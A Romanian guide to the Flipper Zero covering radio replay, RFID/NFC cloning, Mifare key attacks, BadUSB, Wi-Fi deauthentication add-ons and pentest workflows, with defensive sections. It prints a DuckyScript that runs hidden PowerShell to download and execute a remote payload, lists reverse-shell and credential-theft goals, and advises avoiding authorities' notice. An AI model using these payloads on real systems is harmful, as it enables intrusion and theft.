---
title: "Flipper Zero: Ghidul complet pentru hackeri și maker-i"
draft: false
toc: true
date: 2023-05-26
lastmod: 2026-11-27
description: "Ghid Flipper Zero despre radio, protocoale, firmware, GPIO, BadUSB, fluxuri de testare, limite legale și accesorii."
genre: ["Hacking hardware", "Securitate cibernetică", "Testare de penetrare", "Securitate wireless", "Operațiuni de tip red team"]
tags: ["Flipper Zero", "hacking hardware", "Sub-GHz", "NFC", "RFID", "infraroșu", "iButton", "BadUSB", "GPIO", "Bluetooth", "firmware Unleashed", "firmware Xtreme", "RogueMaster", "placă WiFi de dezvoltare", "testare de penetrare", "echipă roșie", "securitate wireless", "clonare RFID", "Mifare Classic", "EM4100", "HID Prox", "atac prin reluare", "forță brută", "accesorii Flipper Zero", "sursă deschisă", "audit de securitate", "securitate fizică", "inginerie socială", "CTF", "firmware Flipper Zero", "aplicații Flipper Zero", "reluare Sub-GHz", "U2F", "legalitatea Flipper Zero", "analiza frecvențelor", "hacking UART", "SPI", "I2C", "JTAG", "SWD", "GPIO Flipper Zero", "WiFi Flipper Zero", "Bluetooth Flipper Zero", "NFC Flipper Zero", "RFID Flipper Zero", "IR Flipper Zero", "ghid Flipper Zero 2026"]
cover: "/img/cover/A_colorful_illustration_of_a_Flipper_Zero_device.webp"
coverAlt: "Ilustrație colorată cu un dispozitiv Flipper Zero înconjurat de instrumente și semnale wireless, care îi sugerează versatilitatea și capabilitățile"
coverCaption: ""
---

**Flipper Zero** este cel mai cunoscut dispozitiv multifuncțional din comunitatea de securitate practică. Încape în buzunar, costă aproximativ 170 USD și reunește un radio Sub-GHz, un cititor RFID de 125 kHz, o antenă NFC, un transceiver infraroșu, un port iButton, un radio Bluetooth, un conector de extensie GPIO și un port USB într-un dispozitiv suficient de mic pentru a fi prins de un breloc. Acest ghid prezintă toate capabilitățile, de la despachetare până la fluxuri avansate de red team.

*Citește secțiunile în ordine dacă nu ai mai folosit Flipper Zero. Dacă ai deja unul și vrei să aprofundezi un anumit subsistem, mergi direct la secțiunea respectivă.*

## Prezentarea hardware-ului

**Flipper Zero** folosește un microcontroler STM32WB55. Acest cip Arm Cortex-M4 / Cortex-M0+ cu două nuclee integrează un radio Bluetooth 5.0. Aplicația principală rulează pe nucleul M4 la până la 64 MHz, iar nucleul M0+ gestionează stiva Bluetooth.

| Componentă | Detalii |
|-----------|---------|
| **MCU** | STM32WB55RGV6, Cortex-M4 la 64 MHz + Cortex-M0+ |
| **Flash** | 1 MB intern + 256 Mbit SPI NOR extern |
| **RAM** | 256 KB SRAM |
| **Ecran** | E-paper de 1,4 inchi (128x64), permanent activ |
| **Radio Sub-GHz** | Transceiver CC1101, 300–928 MHz |
| **RFID** | Front-end analogic de 125 kHz (EM4100, HID, Indala și altele) |
| **NFC** | ST25R3916B, 13,56 MHz ISO 14443A/B și 15693 |
| **IR** | LED emițător de 940 nm + senzor receptor TSOP75338 |
| **iButton** | Interfață 1-Wire, DS1990A și chei cu memorie tactilă |
| **Bluetooth** | BLE 5.0 (integrat în STM32WB55) |
| **GPIO** | Conector cu 18 pini: SPI, I2C, UART, alimentare 5V/3,3V, ADC |
| **USB** | USB-C, suport de dispozitiv HID (BadUSB / U2F) |
| **Baterie** | Li-Po de 2000 mAh, încărcare USB-C, aproximativ 30 de ore de utilizare tipică |
| **MicroSD** | Până la 128 GB, FAT32 sau exFAT |

**Ecranul e-paper** nu consumă energie cât timp afișează o imagine statică. De aceea, autonomia bateriei este excelentă chiar și când dispozitivul rămâne în așteptare.

**CC1101** este un transceiver Sub-GHz universal de la Texas Instruments, care acoperă intervalele 300–348 MHz, 387–464 MHz și 779–928 MHz. Caracterul său programabil face modulul Sub-GHz foarte flexibil.

## Opțiuni de firmware

Poți folosi **firmware-ul oficial Flipper Zero** sau unul dintre fork-urile populare ale comunității. Fiecare fork activează funcții limitate de Flipper Devices din motive de reglementare și legale.

| Firmware | Descriere | Funcții deblocate |
|----------|-------------|-------------|
| **Official** | Firmware-ul standard de la Flipper Devices | Setări implicite prudente și sigure |
| **Unleashed** | Cel mai popular fork, axat pe stabilitate | Toate frecvențele Sub-GHz și protocoale suplimentare |
| **Xtreme** | Bogat în funcții și întreținut activ | Interfață personalizată, aplicații suplimentare și deblocări Sub-GHz |
| **RogueMaster** | Pachet cu multe aplicații terțe | Cea mai mare colecție de aplicații inclusă din start |

Instalează un fork prin flash-uire cu aplicația desktop **qFlipper** pentru Windows, macOS sau Linux, ori copiază un fișier `.dfu` pe cardul SD și folosește meniul de actualizare al dispozitivului.

*Unleashed este cel mai sigur punct de pornire pentru cercetare. Xtreme este preferat de cei care vor cel mai mare set de funcții. Folosește firmware-ul oficial în timpul călătoriilor pentru a reduce atenția autorităților.*

## Radio Sub-GHz

Modulul Sub-GHz atrage cea mai multă atenție. Acesta permite înregistrarea, analizarea, reluarea și transmiterea semnalelor în intervalele de frecvență folosite de uși de garaj, telecomenzi auto, sonerii, stații meteo fără fir, prize și sute de alte dispozitive.

### Intervalele de frecvență acceptate

- **300–348 MHz** — telecomenzi mai vechi și anumite sisteme de uși de garaj din SUA
- **387–464 MHz** — dispozitive europene și americane; 433,92 MHz este cea mai răspândită bandă ISM la nivel global
- **779–928 MHz** — 868 MHz în Europa, 915 MHz în banda ISM din SUA și 868 MHz LoRa

### Scheme de modulație uzuale

| Modulație | Semnificație |
|------------|---------------|
| **AM (ASK/OOK)** | Modulație prin deplasarea amplitudinii; semnal simplu pornit/oprit, folosit de majoritatea telecomenzilor simple. |
| **FM (FSK/2-FSK)** | Modulație prin deplasarea frecvenței; folosită de stațiile meteo și unele telecomenzi auto. |
| **APSK** | Combinație de scheme, folosită de puține dispozitive inteligente. |

Flipper poate decoda automat semnale OOK brute. Le afișează vizual pe ecran și le poate reda la apăsarea unui singur buton. Acest lucru a făcut Flipper Zero cunoscut: **reluarea unui cod static este extrem de ușoară la dispozitivele fără coduri variabile**.

### Coduri variabile și coduri statice

Dispozitivele cu **cod static** transmit de fiecare dată același semnal. Flipper Zero îl înregistrează o dată și îl poate reda oricând. Aproape toate prizele wireless ieftine, soneriile și ușile de garaj mai vechi folosesc coduri statice.

Dispozitivele cu **cod variabil** (KeeLoq, AUT64 și altele) schimbă codul după fiecare utilizare. Un semnal capturat nu poate fi redat direct. Atacurile asupra sistemelor cu cod variabil sunt mai complexe și necesită instrumente specializate și sincronizare la distanță mică. Flipper Zero nu poate învinge codurile variabile moderne direct din cutie.

*Testează dispozitivele pe care le deții. Dispozitivele cu cod static din propria locuință sunt o țintă excelentă de învățare.*

### Flux de lucru Sub-GHz

1. Deschide **Sub-GHz** din meniul principal.
2. Alege **Read** (opțiunea de citire și captare a semnalului) pentru a captura un semnal. Îndreaptă dispozitivul spre o telecomandă și apasă butonul acesteia.
3. Flipper decodează semnalul și afișează frecvența, modulația și secvența brută de biți.
4. Apasă **Save** (opțiunea de salvare a semnalului) pentru a-l salva pe cardul SD.
5. Apasă **Send** (opțiunea de retransmitere a semnalului) sau deschide ulterior fișierul salvat pentru a retransmite semnalul.

Modul **Frequency Analyzer** (analizor de frecvență) scanează pasiv spectrul și arată frecvențele active. Este util pentru a identifica emițătoare necunoscute.

### Atacuri prin forță brută

Pentru protocoalele cu un spațiu mic de chei, precum telecomenzile vechi cu un cod static de numai 12 sau 24 de biți, Flipper poate rula o secvență de **forță brută** care încearcă fiecare cod posibil. Metoda funcționează împotriva dispozitivelor foarte vechi sau ieftine, dar este complet ineficientă împotriva codurilor variabile sau a spațiilor mari de chei.

Firmware-ul personalizat include dicționare suplimentare pentru forță brută și secvențe de atac specifice unor producători. Printre cele uzuale se numără **Came 12bit**, **Nice 12bit**, **Linear 8bit** și **Holtek 12bit**.

## RFID (125 kHz, frecvență joasă)

Modulul **RFID de 125 kHz** citește și scrie carduri de proximitate cu frecvență joasă. Aceste carduri și brelocuri sunt folosite de sisteme vechi de control al accesului, etichete cu microcipuri pentru animale și sisteme de urmărire industrială.

### Tipuri de carduri acceptate

| Tip de card | Note |
|-----------|-------|
| **EM4100 / EM4102** | Cele mai comune, doar citire la 64 de biți. Se găsesc în sisteme de acces ieftine din toată lumea. |
| **HID Prox** | Popular în sistemele comerciale de control al accesului (HID Global H10301 și variante). |
| **Indala Prox** | Format Motorola / Indala folosit de sisteme mai vechi. |
| **IoProx** | Kantech IoProx, întâlnit și în clădiri comerciale din America de Nord. |
| **FDX-B (ISO 11784/11785)** | Standard pentru microcipuri de animale. |
| **Pyramid** | Farpointe Data; similar cu Indala. |
| **Viking** | Mai rar, folosit de unele sisteme europene. |

### Citirea unui card LF

Ține marginea superioară a dispozitivului Flipper, unde se află antena, la câțiva centimetri de card sau breloc. Accesează **125 kHz RFID > Read** (meniul de citire a unui card RFID). Opțiunea Read (citește) citește cardul LF și afișează ID-ul. Dispozitivul citește ID-ul în una-două secunde și afișează codul unității și numărul cardului.

### Emulare și clonare

După citire, poți salva cardul și îl poți **emula** ulterior selectând fișierul salvat și apăsând butonul. Flipper transmite ID-ul cardului, astfel încât cititorul îl recunoaște ca pe cardul original.

Poți și **scrie** ID-ul pe un card T5577 gol, reprogramabil. Cardurile T5577 sunt ieftine (aproximativ 0,50 USD fiecare) și acceptă majoritatea formatelor de joasă frecvență.

*Clonarea cardurilor de acces pe care nu le deții sau nu ești autorizat să le testezi este infracțiune în majoritatea jurisdicțiilor. Obține întotdeauna autorizare scrisă înainte de a testa orice sistem de control al accesului.*

### Limitele RFID LF

RFID-ul de joasă frecvență nu oferă protecție criptografică. Oricine are un cititor în apropierea ta îți poate citi ID-ul cardului. Securitatea fizică modernă folosește carduri inteligente de înaltă frecvență (NFC la 13,56 MHz) cu autentificare reciprocă.

## NFC (13,56 MHz, frecvență înaltă)

Modulul **NFC** folosește cipul ST25R3916B și acceptă ISO 14443A, ISO 14443B și ISO 15693. Această frecvență este folosită de carduri de plată contactless, carduri de transport, carduri inteligente de acces în clădiri și etichete NFC.

### Standarde acceptate

| Standard | Utilizare obișnuită |
|----------|-----------|
| **ISO 14443A** | Mifare Classic, Mifare DESfire, NXP NTAG și carduri de credit/debit |
| **ISO 14443B** | Unele acte de identitate guvernamentale și pașapoarte (stratul exterior) |
| **ISO 15693** | Etichete de bibliotecă și unele sisteme RFID industriale |
| **EMV (Nivelul 1)** | Numai citirea metadatelor cardurilor de plată contactless |
| **NFC-A/B/F/V** (protocoale NFC) | Schimb general de date NFC |

### Atacuri Mifare Classic

**Mifare Classic** este un standard de card inteligent la 13,56 MHz, spart teoretic în 2008. Multe sisteme vechi de transport și acces în clădiri încă îl folosesc. Flipper Zero poate efectua mai multe atacuri:

- **Read** (citește) — citește sectoarele care folosesc cheia implicită din fabrică (`FFFFFFFFFFFF` sau `A0A1A2A3A4A5`).
- **Atac cu dicționar** — încearcă o listă de chei frecvente pentru sectoarele blocate. Firmware-ul personalizat include dicționare mari de chei.
- **Atac nested** — necesită cel puțin o cheie de sector cunoscută. Folosește criptoanaliză bazată pe temporizare pentru a deduce cheile altor sectoare.
- **Atac Darkside** — funcționează și fără chei cunoscute în unele versiuni Mifare Classic. Flipper trebuie ținut la mai puțin de un centimetru de card.

După citirea tuturor sectoarelor, salvează dump-ul complet și **emulează** cardul. Flipper îl emulează ca și cum ar fi cardul original, inclusiv datele sectoarelor.

*Nu clona carduri Mifare Classic cu valoare monetară activă, precum călătorii de transport sau credite de parcare, decât dacă deții cardul și controlezi sistemul din spate.*

### Mifare DESfire și carduri moderne

Cardurile **Mifare DESfire EV1/EV2/EV3** folosesc criptare AES-128 și autentificare reciprocă. Flipper Zero nu le poate citi datele protejate. Poate citi UID-ul cardului și lista AID, dar fără cheile corecte nu poate accesa datele aplicațiilor. Acesta este comportamentul intenționat: DESfire oferă securitate adecvată.

**Cardurile de plată EMV** — Visa, Mastercard și Amex contactless — pot expune metadate publice, precum numărul cardurilor mai vechi, data expirării și istoricul tranzacțiilor. Cardurile moderne au redus datele returnate la citirea publică. Flipper nu poate iniția și nici intercepta tranzacții reale de plată.

### Etichete NFC și NDEF

**NDEF (NFC Data Exchange Format)** este formatul standard al etichetelor NFC folosite în marketing, autentificarea produselor și etichete inteligente. Flipper poate citi, salva, scrie și emula etichete NDEF. Acest lucru este util pentru:

- Clonarea etichetelor NXP NTAG203 sau NTAG213 în scop de testare
- Scrierea unor date NDEF personalizate (URL-uri, carduri de contact și acreditări Wi-Fi)
- Emularea unei etichete pentru a declanșa o acțiune pe telefon fără eticheta fizică

## Infraroșu (IR)

Modulul infraroșu cuprinde un LED de 940 nm pentru transmisie și un demodulator TSOP75338 pentru recepție. Acceptă aproape toate protocoalele telecomenzilor IR de consum.

### Protocoale decodificate acceptate

| Protocol | Dispozitive obișnuite |
|----------|---------------|
| **NEC** | Cel mai comun; folosit de LG, Samsung, Panasonic și multe alte mărci |
| **RC5** | Dispozitive Philips |
| **RC6** | Philips, Microsoft și receptoare de cablu |
| **Samsung32** | Televizoare și sisteme home theater Samsung |
| **NECext** | NEC extins, cu adrese pe 32 de biți |
| **SIRC12 / SIRC15 / SIRC20** | Dispozitive Sony |
| **Kaseikyo** | Panasonic, JVC |
| **RCA** | Telecomenzi RCA |

Flipper capturează și retransmite **semnale IR brute** pentru protocoalele pe care nu le poate decodifica. Captura brută păstrează durata exactă a impulsurilor și pauzelor și o retransmite cu fidelitate completă.

### Telecomanda universală

Aplicația integrată **Universal Remotes** permite navigarea într-o bază de coduri IR organizată după marcă și categorie de dispozitiv. Poți opri televizoare, regla volumul soundbar-urilor și controla aparate de aer condiționat fără o telecomandă fizică. Biblioteca IR întreținută de comunitate pe GitHub (`flipperzero-ir-relay`) conține mii de coduri suplimentare.

*Într-o operațiune red team sau de inginerie socială, telecomanda IR universală poate distrage atenția în spații cu ecrane vizibile.*

### Capturarea propriei telecomenzi

1. Accesează **Infrared > Learn New Remote** (infraroșu > învață o telecomandă nouă).
2. Îndreaptă telecomanda originală spre fereastra receptorului IR de pe marginea superioară a Flipper.
3. Apasă fiecare buton pe care vrei să-l capturezi. Flipper salvează fiecare buton separat.
4. Denumește și salvează fișierul telecomenzii.
5. Retransmite orice buton din fișierul salvat.

## iButton și 1-Wire

**iButton** (Dallas/Maxim 1-Wire) este un protocol cu contact, folosit în unele sisteme de acces fizic, urmărirea activelor și detectarea temperaturii. Contactul iButton este discul sau cilindrul metalic mic care atinge cititorul.

### Tipuri de chei acceptate

| Tip de cheie | Note |
|----------|-------|
| **DS1990A** | Cea mai frecventă cheie de acces; ID unic de 64 de biți, numai citire |
| **DS1992** | Cheie de memorie cu NVRAM de 1 KB |
| **DS1996** | Cheie de memorie cu NVRAM de 64 KB |
| **Cyfral** | Format de sistem de acces din Europa de Est |
| **Metacom** | Format de interfon mai puțin răspândit |

Citește cheia atingând portul iButton al Flipper (contactele aurii de pe marginea inferioară) de cheie. Salveaz-o și emuleaz-o prin același flux ca pentru RFID și NFC. Flipper poate scrie și ID-uri de cheie pe chei iButton RW1990 goale, reprogramabile.

## GPIO și hacking hardware

Conectorul **GPIO cu 18 pini** din partea superioară a Flipper Zero este interfața principală pentru hacking hardware. Expune SPI, I2C, UART, ADC și liniile de alimentare.

### Pinout GPIO

| Pin | Funcție |
|-----|---------|
| **1** | 5V (intrare, de la USB numai când este conectat) |
| **2, 4** | GND |
| **3** | Ieșire 3,3V (max. 20 mA) |
| **5** | PA4 / SPI1_MISO / ADC |
| **6** | PA6 / SPI1_SCK |
| **7** | PA7 / SPI1_MOSI |
| **8** | PA3 / UART TX |
| **9** | PB3 / UART RX |
| **10** | PC3 / ADC |
| **11** | PC1 / ADC |
| **12** | PA0 / ADC |
| **13** | PB2 / GPIO |
| **14** | PE3 / SPI1_CS |
| **15** | PB4 / I2C1_SDA |
| **16** | PB13 / I2C1_SCL |
| **17** | PB14 / GPIO / USART1 TX (depanare) |
| **18** | PA8 / GPIO |

*Toți pinii GPIO folosesc niveluri logice de 3,3V. Nu aplica 5V pinilor de date. Folosește un convertor de nivel pentru dispozitivele de 5V.*

### Acces la consola UART

Multe dispozitive încorporate expun o consolă de depanare UART care rămâne activată în producție. Dacă legi pinii UART ai Flipper la pinii UART TX/RX ai dispozitivului-țintă, poți accesa consola serială și poate:

- Deschide un shell cu privilegii
- Observa în jurnalul de pornire acreditări și informații despre sistem
- Scrie firmware fără semnătură dacă meniul bootloaderului este accesibil

Accesează **GPIO > USB-UART Bridge** (meniul GPIO pentru deschiderea unei punți USB către UART) sau folosește aplicația GPIO pentru a deschide o conexiune la terminal. Flipper apare pe calculatorul conectat ca port serial USB și face legătura cu pinii UART.

### Senzori SPI și I2C

Conectează direct la conectorul GPIO orice senzor SPI sau I2C, de exemplu un accelerometru, un senzor de presiune barometrică, un senzor de temperatură și umiditate sau un ecran OLED. Există aplicații comunitare pentru multe cipuri obișnuite:

- **SSD1306** — driver pentru ecran OLED
- **BME280** — temperatură, umiditate și presiune
- **NRF24L01** — modul radio de 2,4 GHz care extinde suprafața de atac wireless
- **CC1101** — antenă externă pentru a îmbunătăți raza Sub-GHz

### Depanare JTAG și SWD

Conectorul GPIO al Flipper expune semnale SWD pe câțiva pini. Cu un adaptor, poți folosi Flipper ca **sondă de depanare JTAG/SWD** pentru a:

- Opri și parcurge pas cu pas codul de pe un microcontroler-țintă
- Citi și scrie memoria flash
- Extrage firmware de pe dispozitive blocate printr-un glitch de tensiune urmat de acces de depanare

Este un subiect avansat. Portarea firmware-ului **BlackMagic Probe** pentru Flipper face acest flux practic.

{{< figure src="flipper-zero-gpio-uart-jtag-swd-hardware-attack-surface-diagram.webp" alt="Diagramă a conectorului GPIO Flipper Zero care prezintă legăturile UART, SPI, I2C, JTAG și SWD cu dispozitive încorporate" >}}

## BadUSB și atacuri USB HID

Când este conectat la un calculator prin USB-C, Flipper Zero se identifică drept o **tastatură USB HID**. Acesta este vectorul de atac BadUSB: dispozitivul introduce automat apăsări de taste fără să instaleze un driver.

### DuckyScript

Scripturile BadUSB pentru Flipper folosesc **DuckyScript**, același limbaj de scripting utilizat de USB Rubber Ducky de la Hak5. Scriptul este un fișier text simplu plasat în `badusb/` pe cardul SD.

```
REM Deschide dialogul Executare și pornește PowerShell
DELAY 500
GUI r
DELAY 300
STRING powershell -NoP -W Hidden -Exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')"
ENTER
```

Sarcini utile BadUSB:

- **Shell inversat** — deschide o conexiune de rețea înapoi către calculatorul unui atacator
- **Extragerea acreditărilor** — rulează Mimikatz sau instrumente similare în memorie
- **Persistență** — adaugă o intrare la pornire sau o sarcină programată
- **Extragerea parolelor Wi-Fi** — folosește `netsh` pentru a exporta profilurile wireless salvate
- **Injectarea unei chei SSH** — adaugă o cheie de atacator în `authorized_keys`

### Apărare împotriva BadUSB

Atacul BadUSB funcționează fiindcă sistemele de calcul au încredere implicită în tastaturi. Măsurile de apărare includ:

- **USBGuard** (Linux) — listează ca permise dispozitive USB după ID-ul producătorului și al produsului
- **Politica Windows de blocare USB** — dezactivează dispozitivele HID de la producători care nu se află pe lista de permisiuni
- **Blocatoare fizice de porturi** — împiedică introducerea USB în medii cu securitate ridicată
- **Detecție la nivel de endpoint** — soluții precum CrowdStrike detectează euristic injectarea rapidă de apăsări de taste

### Token hardware U2F

Flipper Zero poate funcționa și ca **cheie de securitate hardware FIDO U2F**. Firmware-ul oficial include suport U2F. Înregistrează Flipper pe orice site care acceptă FIDO U2F, precum GitHub, Google, Cloudflare și altele, apoi atinge butonul din spatele dispozitivului pentru a confirma autentificarea.

Astfel, Flipper devine și un token hardware pentru propriile conturi. Stochează materialul cheii private în memoria securizată a microcontrolerului.

## Bluetooth

STM32WB55 include Bluetooth 5.0. Flipper folosește BLE pentru:

- **Flipper Mobile App** — aplicație iOS și Android pentru gestionarea fișierelor, actualizarea firmware-ului și control de la distanță
- **BadBT** (aplicație comunitară) — introduce apăsări DuckyScript prin Bluetooth în loc de USB, pentru injectare HID wireless către gazde Bluetooth asociate
- **Scanner BLE** — scanează pasiv anunțurile BLE din apropiere, util pentru inventarierea dispozitivelor IoT dintr-o clădire

Raza Bluetooth este modestă, aproximativ 10–30 de metri în spațiu deschis. Este suficientă pentru a livra wireless un BadUSB dintr-o geantă sau dintr-un buzunar când te afli lângă stația de lucru-țintă.

### Asocierea aplicației mobile

1. Descarcă **Flipper Mobile App** din App Store sau Google Play.
2. Pe Flipper, accesează **Settings > Bluetooth > Pair Phone** (meniul pentru asocierea telefonului prin Bluetooth).
3. Deschide aplicația și urmează instrucțiunile de asociere.
4. Folosește aplicația pentru a răsfoi cardul SD, a instala aplicații din catalog și a transmite date de la senzori.

## Prezentare aprofundată a firmware-ului personalizat

### Firmware Unleashed

**Unleashed** (disponibil la `github.com/DarkFlippers/unleashed-firmware`) este cel mai conservator fork comunitar. Elimină restricțiile geografice pentru frecvențele Sub-GHz și extinde suportul pentru protocoale, păstrându-se aproape de baza de cod oficială. Prioritatea este stabilitatea.

Adăugiri importante față de versiunea oficială:

- Interval Sub-GHz extins (300–928 MHz fără restricții)
- Protocoale Sub-GHz suplimentare (CAME, Nice, DoorHan și altele)
- Protocoale NFC suplimentare
- Suport extins DuckyScript pentru BadUSB
- Bază de date IR mai mare

### Firmware Xtreme

**Xtreme** (disponibil la `github.com/Flipper-XFW/Xtreme-Firmware`) adaugă un sistem complet de elemente grafice personalizate peste funcțiile Unleashed. Poți schimba numele Flipper, ecranul de pornire, animațiile desktopului și comportamentul LED-ului. Meniul Settings are mult mai multe opțiuni.

Funcții suplimentare:

- App Hub cu aplicații terțe selectate
- Sarcini de atac Sub-GHz și NFC extinse
- Scripturi pentru LED-uri RGB
- Îmbunătățiri ale gestionării fișierelor

### RogueMaster

**RogueMaster** include cea mai mare colecție de aplicații terțe și instrumente comunitare, multe experimentale sau riscante în anumite situații. Este mai puțin stabil decât Unleashed sau Xtreme, dar oferă cele mai multe instrumente într-o singură instalare.

### Instalarea oricărui firmware

```bash
# Folosind CLI-ul qFlipper
qFlipper cli -c firmware /path/to/firmware.dfu

# Sau pune firmware.zip în rădăcina cardului SD, apoi accesează:
# Settings > Firmware Update > Update from SD Card (Setări > Actualizare firmware > Actualizare de pe cardul SD)
```

*Fă întotdeauna backup la conținutul cardului SD înainte de o actualizare de firmware. Procesul nu șterge cardul SD, dar backup-ul rămâne o bună practică.*

## Ecosistemul de aplicații Flipper

### Catalogul oficial de aplicații

Catalogul oficial de la **lab.flipper.net** listează aplicații care se pot instala direct din aplicația mobilă. Categoriile includ:

- Instrumente Sub-GHz
- Utilitare NFC
- Jocuri
- Senzori GPIO
- Instrumente pentru dezvoltatori
- Muzică și divertisment

### Surse comunitare de aplicații

- **flipc.org** — bază comunitară de semnale Sub-GHz capturate, dump-uri NFC și baze IR organizate după dispozitiv
- **awesome-flipperzero** (GitHub) — listă selectată de aplicații, instrumente, scripturi și extensii hardware
- **UberGuidoZ Flipper** (GitHub) — depozit amplu de capturi Sub-GHz organizate după protocol și producător

### Aplicații terțe notabile

| Aplicație | Scop |
|-----|---------|
| **Seader** | Citește date PACS de pe carduri inteligente cu un modul compatibil Wiegand |
| **POCSAG Pager** | Decodează mesaje POCSAG de pager la 152–160 MHz |
| **iButton Fuzzer** | Încearcă prin forță brută spațiile de chei iButton |
| **NFC Playlist** | Parcurge automat o listă de carduri NFC |
| **T5577 Writer** | Scrie date EM4100/HID pe carduri T5577 goale |
| **BLE Spam** | Inundă dispozitivele din apropiere cu pachete de anunț BLE |
| **ESP32 WiFi Marauder** | Controlează WiFi Marauder pe o placă de dezvoltare ESP32 WiFi |
| **Metroflip** | Analizează și afișează date de pe carduri de transport |
| **USB Mouse Jiggler** | Menține ecranul activ prin mișcarea simulată a mouse-ului HID |

## Accesorii și extensii hardware

### WiFi Dev Board

**WiFi Dev Board** se conectează direct la conectorul GPIO al Flipper. Conține un ESP32-S2 care rulează firmware-ul **WiFi Marauder** și adaugă capabilități complete 802.11 b/g/n:

- **Scanare SSID** — inventariază toate punctele de acces din apropiere
- **Flood de beacon-uri** — transmite zeci de SSID-uri false pentru a deruta clienții și a crea zgomot vizibil
- **Atac de deautentificare** — trimite cadre 802.11 de deautentificare pentru a deconecta clienții de la un punct de acces
- **Captură de probe** — captează solicitări de sondare pentru a identifica dispozitivele și SSID-urile memorate
- **Atac WPS** — caută routere cu WPS activat și încearcă enumerarea PIN-urilor (lent)
- **Captură PMKID** — captează hash-uri PMKID pentru spargere offline fără client

WiFi Dev Board se controlează prin ecranul și butoanele Flipper. Nu este nevoie de telefon sau calculator.

*Trimiterea cadrelor de deautentificare împotriva rețelelor pe care nu le deții este ilegală în SUA conform Computer Fraud and Abuse Act (CFAA) și legilor echivalente din majoritatea țărilor. Folosește acest instrument numai într-un laborator autorizat.*

### Modulul Video Game

**Video Game Module** conține un RP2040 și o baterie mică reîncărcabilă. Se conectează la conectorul GPIO și adaugă funcții de joc multiplayer wireless. Poate funcționa și ca microcontroler independent pentru cod personalizat care preia sarcini de procesare de la STM32-ul principal.

### Modul ESP32 WROOM (DIY)

Un **ESP32-WROOM-32** standard conectat la GPIO-ul Flipper prin UART sau SPI extinde și mai mult suprafața de atac:

- Wi-Fi 802.11 complet cu firmware personalizat
- Bluetooth Classic de 2,4 GHz și BLE simultan cu BLE-ul propriu al Flipper
- Extindere GPIO externă
- Interfață de server web pentru control de la distanță în timpul operațiunilor fizice

### Adaptor de conector pentru Raspberry Pi Zero 2W

Adaptoarele proiectate de comunitate conectează un **Raspberry Pi Zero 2W** la conectorul GPIO al Flipper. Pi rulează un mediu Linux complet și comunică cu Flipper prin UART sau serial USB. Este folosit pentru:

- Înregistrarea datelor pe perioade lungi
- Rularea Bettercap sau Kismet pentru recunoașterea rețelei
- Acționarea ca releu C2 în operațiuni red team
- Stocarea capturilor mari care ar depăși capacitatea unui card microSD

{{< figure src="flipper-zero-wifi-devboard-esp32-raspberry-pi-gpio-accessories-overview.webp" alt="Prezentarea accesoriilor hardware Flipper Zero, inclusiv WiFi Dev Board, modulul ESP32 și adaptorul pentru conectorul GPIO al Raspberry Pi Zero" >}}

## Fluxuri de testare a penetrării

### Flux de ocolire a accesului fizic

1. Folosește **cititorul RFID de 125 kHz** pentru a citi ecusoanele angajaților în timp ce te apropii firesc de ei în hol.
2. Clonează ecusonul pe un card T5577 gol sau emulează-l direct de pe Flipper.
3. Folosește ecusonul clonat pentru a intra în zone securizate.
4. Notează ce cititoare au acceptat acreditarea clonată și raportează clientului.

Testul verifică dacă locația se bazează pe EM4100 (nesigur și clonabil) sau pe carduri inteligente NFC moderne (mai greu de clonat).

### Inventarierea dispozitivelor wireless

1. Parcurge locația-țintă cu **Sub-GHz Frequency Analyzer** (analizor de frecvență sub-GHz) activ.
2. Notează toate frecvențele și tipurile de semnal active.
3. Folosește modul **Read** (opțiunea de citire și captare a semnalului) pentru a capta și identifica semnale de la dispozitive precum senzori wireless de alarmă, bariere de parcare și controlere HVAC.
4. Raportează toate dispozitivele cu cod static ca probleme cu severitate ridicată.

### Inspectarea RFID

1. Folosește modul **NFC > Detect Reader** pentru ca Flipper să se comporte ca un card și să detecteze cititoarele din apropiere fără să transporte acreditări.
2. Identifică tipurile de cititor (compatibil cu Mifare Classic, DESfire sau ISO 15693) pentru a evalua securitatea fiecărui punct de acces.

### Simularea unui atac BadUSB prin abandonarea dispozitivului

1. Încarcă din timp o sarcină DuckyScript pe cardul SD al Flipper.
2. Lasă Flipper conectat la o stație de lucru deblocată. Este necesar accesul fizic.
3. Scriptul rulează automat: inventariază gazda, exfiltrează acreditările și stabilește o conexiune de tip callback.
4. Notează timpul până la execuție și rata de detectare.

Testul evaluează politicile organizației de control al dispozitivelor USB și acoperirea sistemelor de detecție la nivel de endpoint.

### Testarea senzorilor wireless de alarmă

Mulți senzori wireless pentru uși și ferestre transmit semnale OOK simple în banda Sub-GHz. Dacă folosesc coduri statice:

1. **Înregistrează** semnalul senzorului, declanșat prin deschiderea unei ferestre într-un mediu de testare autorizat.
2. **Redă** semnalul pentru a simula declanșarea senzorului fără să deschizi fizic fereastra.
3. Verifică dacă sistemul de alarmă generează o alertă.

Acest lucru arată dacă un atacator ar putea învinge senzorii wireless perimetrali cu un dispozitiv de 170 USD.

{{< figure src="flipper-zero-penetration-testing-physical-access-rfid-badusb-workflow-diagram.webp" alt="Diagramă de flux pentru testele de penetrare cu Flipper Zero, cu ocolirea accesului fizic, inventarierea dispozitivelor wireless, inspectarea RFID și simularea unui atac BadUSB prin abandonarea dispozitivului" >}}

## Utilizări în CTF și competiții

Flipper Zero apare în competiții **Capture The Flag** la categoriile de securitate fizică. Provocările obișnuite includ:

- Clonarea unui ecuson pentru a deschide o cutie încuiată care conține un steag
- Redarea unui semnal Sub-GHz pentru a descuia o ușă simulată
- Decodarea unui semnal IR pentru a recupera un mesaj ascuns
- Emularea unei etichete NFC pentru autentificare ca alt utilizator
- Folosirea BadUSB pentru a executa o sarcină pe un calculator supravegheat

Jurnalul integrat al Flipper și capacitatea mare a cardului SD facilitează arhivarea fiecărui semnal captat la un eveniment CTF pentru analiză ulterioară.

## Utilizări defensive

Echipele de securitate folosesc Flipper Zero pentru a-și audita propriile medii:

- **Auditul cardurilor** — citește toate cardurile de acces pentru a identifica sistemele EM4100 sau Mifare Classic nesigure, care ar trebui actualizate la DESfire EV2 sau versiuni ulterioare.
- **Auditul dispozitivelor wireless** — identifică toate dispozitivele Sub-GHz și semnalează sistemele cu cod static.
- **Testarea politicii BadUSB** — verifică funcționarea politicilor de blocare a dispozitivelor USB HID.
- **Auditul telecomenzilor IR** — confirmă că echipamentele sensibile nu pot fi controlate cu o telecomandă universală IR.
- **Testarea clonării etichetelor NFC** — determină dacă etichetele NFC de pe produse sau acreditări pot fi clonate.

## Considerații legale și etice

